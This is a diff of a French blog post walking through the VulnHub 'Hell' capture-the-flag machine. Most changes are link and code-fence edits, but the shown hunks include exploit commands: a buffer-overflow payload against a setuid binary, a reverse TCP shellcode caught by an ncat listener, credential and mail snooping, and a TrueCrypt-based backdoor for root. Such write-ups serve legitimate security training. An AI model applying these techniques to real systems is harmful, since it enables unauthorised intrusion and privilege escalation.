@@ -6,7 +6,7 @@ tags: [CTF,VulnHub]
 Aller simple pour l'enfer
 -------------------------
 
-[Hell est un CTF](http://vulnhub.com/entry/hell-1,95/) dont la difficulté est un cran au dessus de la plupart des CTF de *VulnHub* tout comme l'était [Hades](http://devloop.users.sourceforge.net/index.php?article84/solution-du-challenge-hades).  
+[Hell est un CTF](http://vulnhub.com/entry/hell-1,95/) dont la difficulté est un cran au dessus de la plupart des CTF de *VulnHub* tout comme l'était [Hades]({% link _posts/2014-05-23-solution-du-ctf-hades-de-vulnhub.md %}).  
 
 Par conséquent, le présent article risque d'atteindre une certaine longueur. Préparez-vous à manger du Python :-)  
 
@@ -74,7 +74,7 @@ Ni *Wapiti* ni *sqlmap* ne trouvent de moyen d'exploiter le formulaire de login.
 
 Tournons-nous vers ce mystérieux port 666 :  
 
-```plain
+```bash
 $ ncat 192.168.1.29 666 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.29:666.
@@ -91,14 +91,14 @@ Il s'agit bien d'un serveur de type *echo* : on soumet quelque chose et cela nou
 
 Un message indique que le programme est archivé sur le serveur web et effectivement on trouve à la racine un fichier *echoserver.bak*.  
 
-```plain
+```bash
 $ file echoserver.bak 
 echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=e8d0c6cce9504db15d02078b96e4b95e108e2aa2, not stripped
 ```
 
-Bonne nouvelle, le fichier est dynamiquement linké et non strippé, ce ne sera pas aussi compliqué que [le display\_key du CTF Hades](http://devloop.users.sourceforge.net/index.php?article84/solution-du-challenge-hades) :p
+Bonne nouvelle, le fichier est dynamiquement linké et non strippé, ce ne sera pas aussi compliqué que [le display\_key du CTF Hades]({% link _posts/2014-05-23-solution-du-ctf-hades-de-vulnhub.md %}) :p
 
-```plain
+```bash
 $ nm echoserver.bak 
                  U accept@@GLIBC_2.2.5
                  U bind@@GLIBC_2.2.5
@@ -148,7 +148,7 @@ En supposant qu'il y ait un buffer overflow on voit que *strcpy()* n'est pas imp
 
 J'ai récupéré le programme [checksec](http://www.trapkit.de/tools/checksec.html) qui permet de connaître les mécanismes de protection présents sur un binaire ELF.  
 
-```plain
+```bash
 $ checksec.sh --file echoserver.bak
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echoserver.bak
@@ -491,7 +491,7 @@ oj:x:1005:1005::/home/oj:/bin/sh
 
 On peut donc naviguer dans l'arborescence. Qui plus est, on a obtenu des usernames supplémentaires (mais les scripts de brute-force ne donnent rien de plus pour autant).  
 
-Je réutilise la technique d'énumération via *include(*) employée sur le [LAMPSecurity CTF4](http://devloop.users.sourceforge.net/index.php?article96/solution-du-ctf-lampsecurity-ctf4), en adaptant le script au point d'injection :  
+Je réutilise la technique d'énumération via *include(*) employée sur le [LAMPSecurity CTF4]({% link _posts/2014-07-08-Solution-du-CTF-LAMPSecurity-CTF4.md %}), en adaptant le script au point d'injection :  
 
 ```python
 import requests
@@ -599,7 +599,7 @@ if (login()) {
 
 Ce dernier nous permet une connexion SSH :  
 
-```plain
+```bash
 jack@hell:~$ ls -alR 
 .:
 total 28
@@ -645,7 +645,7 @@ Pwn 4 Life
 
 *Jack* est un petit cachottier qui chiffre ses mails (la *NSA* te surveille *Jack* !).  
 
-```plain
+```bash
 jack@hell:~$ cat .pgp/note 
 The usual password as with everything.
 
@@ -669,7 +669,7 @@ svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
 
 Au passage on a les permissions suffisantes pour lire un mail de *George* :  
 
-```plain
+```bash
 jack@hell:~$ cat /var/mail/george/signup.eml 
 From: admin@rockyou.com
 To: super_admin@hell.com
@@ -683,7 +683,7 @@ Thanks for signing up for your account. I hope you enjoy our services.
 
 Continuons notre exploration en nous concentrant sur *George* :  
 
-```plain
+```bash
 jack@hell:~$ cat /etc/aliases
 # /etc/aliases
 mailer-daemon: postmaster
@@ -703,7 +703,7 @@ root: george
 
 On dirait que *George* va être notre passerelle vers root.  
 
-```plain
+```bash
 jack@hell:~$ find / -user george 2> /dev/null 
 /home/george
 /usr/bin/game.py
@@ -750,11 +750,11 @@ COMMIT
 # Completed on Fri Jun 20 11:13:53 2014
 ```
 
-Ca semble plutôt limité pour le moment... On remarque aussi que netstat a été retiré, netcat n'est pas présent et nmap encore moins :'(  
+Ça semble plutôt limité pour le moment... On remarque aussi que netstat a été retiré, netcat n'est pas présent et nmap encore moins :'(  
 
 J'ai eu recours à [mon script Python de scan de port](http://devloop.users.sourceforge.net/index.php?article2/dvscan-python-port-scanner) que j'utilise deux fois l'an :  
 
-```plain
+```bash
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 dvscan.py 1.0
 Launching scan on localhost ['127.0.0.1']
@@ -779,7 +779,7 @@ De toute évidence il est temps de se concentrer sur ce message chiffré. Vu qu'
 
 Bien que la clé soit marquée *PGP* il est possible de l'importer dans *GnuPG* via *--import* :  
 
-```plain
+```bash
 $ gpg --import public.pkr
 gpg: clef 3F18AB0A : clef publique « jack@cowlovers.com » importée
 gpg:       Quantité totale traitée : 1
@@ -795,7 +795,7 @@ gpg:      clefs secrètes importées : 1
 
 On utilisera le mot de passe de *Jack* lors du déchiffrement :  
 
-```plain
+```bash
 $ gpg secret.pgp
 ```
 
@@ -818,14 +818,14 @@ Une fois connecté en tant que *milk\_4\_life* on voit un exécutable setuid geo
 
 Quand on lance le programme il semble se mettre en écoute :  
 
-```plain
+```bash
 milk_4_life@hell:~$ ./game 
 I'm listening
 ```
 
 Si on relance un scan de ports il y en a un de plus :  
 
-```plain
+```bash
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 --- snip ---
 Port ouverts :
@@ -901,7 +901,7 @@ I hear the faint sound of chmodding.......
 
 On recherche les fichiers dont le statut a récemment changé sur le disque :  
 
-```plain
+```bash
 milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v /proc
 /usr/bin/lesson101
 /var/log/auth.log
@@ -917,7 +917,7 @@ Le binaire *lesson101* est devenu setuid george (*George is inside !!!*)
 
 Reprenons une leçon avec *George* :  
 
-```plain
+```bash
 $ /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -938,14 +938,14 @@ Si on rentre un nom trop long on remarque que le programme segfaulte (du verbe s
 
 Comme vu au dessus, on ne dispose d'aucune permission en lecture, heureusement l'ASLR n'est pas activée sur le système :  
 
-```plain
+```bash
 milk_4_life@hell:~$ cat /proc/sys/kernel/randomize_va_space 
 0
 ```
 
 On doit donc pouvoir mettre un shellcode avec une piscine olympique de nops dans l'environnement et écraser l'adresse de retour sur la pile avec l'adresse de notre variable d'environnement.  
 
-Pour la procédure c'est la même que celle utilisée [sur le Brainpan 2](http://devloop.users.sourceforge.net/index.php?article73/solution-du-ctf-brainpan2).  
+Pour la procédure c'est la même que celle utilisée [sur le Brainpan 2]({% link _posts/2014-03-13-Solution-du-CTF-Brainpan-2-de-VulnHub.md %}).  
 
 Le shellcode utilisé ici est [un reverse shell TCP](http://shell-storm.org/shellcode/files/shellcode-833.php). J'ai d'abord voulu lire un programme en Python pour communiquer avec le programme via *subprocess* mais les histoires de buffuring de la console rendent tout ça trop compliqué.  
 
@@ -955,7 +955,7 @@ Finalement j'obtiens mon accès avec un padding de 2 octets.
 
 Côté victime :  
 
-```plain
+```bash
 milk_4_life@hell:~$ python -c "print '10';print 'AA'+'\x77\xff\xfe\xbf'*1000" | /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -971,7 +971,7 @@ Name:
 
 Côté attaquant :  
 
-```plain
+```bash
 $ ncat -l -p 55555 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::55555
@@ -984,7 +984,7 @@ uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george
 
 Un accès SSH récupéré plus tard (*authorized\_keys*) on découvre dans *.bash\_history* des références multiples à *Truecrypt*.  
 
-```plain
+```bash
 george@hell:~$ sudo -l
 Matching Defaults entries for george on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -995,7 +995,7 @@ User george may run the following commands on this host:
 
 Notez qu'un conteneur *Truecrypt* existe déjà sur le système mais les mots de passe connus ne semblent pas fonctionner :  
 
-```plain
+```bash
 george@hell:~$ ls -lh container.tc
 -rw------- 1 george george 4.0M Jun 19 21:09 container.tc
 ```
@@ -1011,7 +1011,7 @@ Le principe est simple : on créé un petit container (10M) montable sous Unix a
 
 Après on le monte depuis *Hell* et on lance la backdoor :  
 
-```plain
+```bash
 george@hell:~$ truecrypt /tmp/crypted.tc /media/truecrypt1
 Enter password for /tmp/crypted.tc: 
 Enter keyfile [none]: 
